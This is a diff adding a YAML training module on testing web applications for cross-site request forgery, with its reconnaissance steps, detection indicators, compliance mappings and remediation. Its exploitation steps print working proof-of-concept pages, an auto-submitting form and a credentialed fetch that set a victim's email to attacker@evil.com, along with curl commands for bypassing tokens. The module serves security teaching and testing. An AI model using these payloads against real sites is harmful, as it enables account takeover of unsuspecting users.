@@ -1,0 +1,174 @@
+# Category: Web Application Security - CSRF
+name: "Cross-Site Request Forgery (CSRF) Testing"
+id: "web-csrf-001"
+category: "web_application"
+subcategory: "csrf"
+difficulty: "beginner"
+estimated_time: "30 minutes"
+
+description: |
+  Identify and exploit Cross-Site Request Forgery vulnerabilities in state-changing
+  web application endpoints. Covers token bypass and SameSite cookie analysis.
+
+learning_objectives:
+  - Identify state-changing endpoints lacking CSRF protections
+  - Craft CSRF proof-of-concept HTML pages
+  - Analyze SameSite cookie policies and their effectiveness
+  - Map to OWASP A01:2021 and compliance controls
+
+tools:
+  - burp_suite
+  - curl
+  - web_browser
+  - python3
+
+prerequisites:
+  - Understanding of HTTP cookies and sessions
+  - Basic HTML knowledge
+  - Written authorization from target owner
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Identify state-changing endpoints (POST, PUT, DELETE, PATCH)"
+    commands:
+      - "burp_suite: Spider/Crawl target application and filter by POST methods"
+      - "curl -s -X OPTIONS 'http://[target_url]/api/user/update' -I"
+      - "curl -s -b '[session_cookie]' 'http://[target_url]/account' | grep -i 'form\\|action\\|method'"
+    expected_output: "List of endpoints accepting POST/PUT/DELETE that modify data"
+    detection: "Automated crawling patterns in web server access logs"
+
+  - id: "step2"
+    phase: "enumeration"
+    action: "Check for CSRF token presence in forms and requests"
+    commands:
+      - "curl -s -b '[session_cookie]' 'http://[target_url]/account/update' | grep -i 'csrf\\|token\\|nonce\\|_token'"
+      - "curl -s -b '[session_cookie]' 'http://[target_url]/account/update' | python3 -c \"import sys,re; print(re.findall(r'csrf[_-]?token[^>]+value=[\\\"\\']([^\\\"\\']+)', sys.stdin.read(), re.I))\""
+    expected_output: "Presence or absence of CSRF token in form or custom header"
+    detection: "No specific detection — normal GET request"
+
+  - id: "step3"
+    phase: "enumeration"
+    action: "Analyze cookie SameSite attribute and security flags"
+    commands:
+      - "curl -s -I 'http://[target_url]/login' | grep -i 'set-cookie'"
+      - "curl -s -c cookies.txt -b '[session_cookie]' 'http://[target_url]/' > /dev/null && cat cookies.txt"
+    expected_output: "Cookie attributes including SameSite=Strict/Lax/None, Secure, HttpOnly"
+    detection: "No specific detection — normal response header analysis"
+
+  - id: "step4"
+    phase: "exploitation"
+    action: "Craft CSRF proof-of-concept HTML page (auto-submit form)"
+    commands:
+      - |
+        cat > /tmp/csrf_poc.html << 'EOF'
+        <html>
+          <body>
+            <h1>CSRF Proof of Concept</h1>
+            <form id="csrf_form" action="http://[target_url]/account/update" method="POST">
+              <input type="hidden" name="email" value="attacker@evil.com"/>
+              <input type="hidden" name="username" value="hacked"/>
+            </form>
+            <script>document.getElementById('csrf_form').submit();</script>
+          </body>
+        </html>
+        EOF
+      - "python3 -m http.server 8080 --directory /tmp"
+    expected_output: "When victim visits page while authenticated, account is modified"
+    detection: "State-changing requests with Referer header from different origin"
+
+  - id: "step5"
+    phase: "exploitation"
+    action: "Test CSRF token bypass techniques"
+    commands:
+      - "# Test 1: Remove CSRF token completely"
+      - "curl -s -b '[session_cookie]' -X POST 'http://[target_url]/account/update' -d 'email=test@test.com'"
+      - "# Test 2: Submit empty CSRF token"
+      - "curl -s -b '[session_cookie]' -X POST 'http://[target_url]/account/update' -d 'csrf_token=&email=test@test.com'"
+      - "# Test 3: Reuse another user's CSRF token"
+      - "curl -s -b '[other_session_cookie]' -X POST 'http://[target_url]/account/update' -d 'csrf_token=[other_users_token]&email=test@test.com'"
+      - "# Test 4: Change POST to GET"
+      - "curl -s -b '[session_cookie]' 'http://[target_url]/account/update?email=test@test.com'"
+    expected_output: "200 OK response with state change confirms CSRF vulnerability"
+    detection: "Requests missing CSRF tokens; cross-origin Referer headers on POST requests"
+
+  - id: "step6"
+    phase: "exploitation"
+    action: "JSON CSRF (for API endpoints accepting JSON)"
+    commands:
+      - |
+        cat > /tmp/json_csrf.html << 'EOF'
+        <html>
+          <body>
+            <script>
+              fetch('http://[target_url]/api/user/update', {
+                method: 'POST',
+                credentials: 'include',
+                headers: {'Content-Type': 'text/plain'},
+                body: '{"email":"attacker@evil.com"}'
+              });
+            </script>
+          </body>
+        </html>
+        EOF
+    expected_output: "If CORS is misconfigured and no CSRF token required, request succeeds"
+    detection: "Cross-origin API requests with cookies; missing CORS preflight"
+
+compliance_controls:
+  - standard: "PCI DSS v4.0"
+    control: "6.2.4"
+    description: "Protect web-facing applications against CSRF"
+  - standard: "OWASP ASVS v4.0"
+    control: "4.2.2"
+    description: "CSRF protection via double-submit cookie or synchronizer token"
+  - standard: "NIST 800-53 Rev5"
+    control: "SC-23"
+    description: "Session authenticity"
+  - standard: "CIS Controls v8"
+    control: "16.1"
+    description: "Establish and maintain secure application development process"
+
+detection:
+  network_indicators:
+    - "POST/PUT/DELETE requests with Referer header from different domain"
+    - "State-changing requests lacking expected CSRF token parameter"
+    - "Cross-origin requests with cookies (credentials: include)"
+  log_indicators:
+    - "WAF alerts for CSRF pattern detection"
+    - "Unexpected account changes in application logs"
+    - "State-changing requests without matching CSRF token in session"
+  endpoint_indicators:
+    - "Browser same-origin policy violations in console"
+    - "Unexpected modifications to user account data"
+
+remediation:
+  immediate:
+    - "Implement synchronizer token pattern (per-session or per-request CSRF token)"
+    - "Set SameSite=Strict or SameSite=Lax on all session cookies"
+    - "Validate Origin and Referer headers on state-changing endpoints"
+  long_term:
+    - "Implement double-submit cookie pattern as defense in depth"
+    - "Use custom request headers for API calls (automatic CORS preflight protection)"
+    - "Adopt SPA framework with built-in CSRF protection"
+    - "Regular security testing of authentication and authorization flows"
+
+variables:
+  target_url: "http://target.example.com"
+  session_cookie: "session=abc123def456"
+  other_session_cookie: "session=xyz789uvw012"
+  other_users_token: "abc123csrf456token"
+
+assessment_questions:
+  - "What is the difference between CSRF and XSS?"
+  - "How does SameSite=Lax protect against CSRF versus SameSite=Strict?"
+  - "When is the synchronizer token pattern vulnerable?"
+  - "Can CSRF affect GET requests? Under what conditions?"
+  - "How does the double-submit cookie pattern work?"
+
+references:
+  - url: "https://owasp.org/www-community/attacks/csrf"
+    title: "OWASP CSRF Overview"
+  - url: "https://portswigger.net/web-security/csrf"
+    title: "PortSwigger CSRF Labs"
+  - url: "https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html"
+    title: "OWASP CSRF Prevention Cheat Sheet"
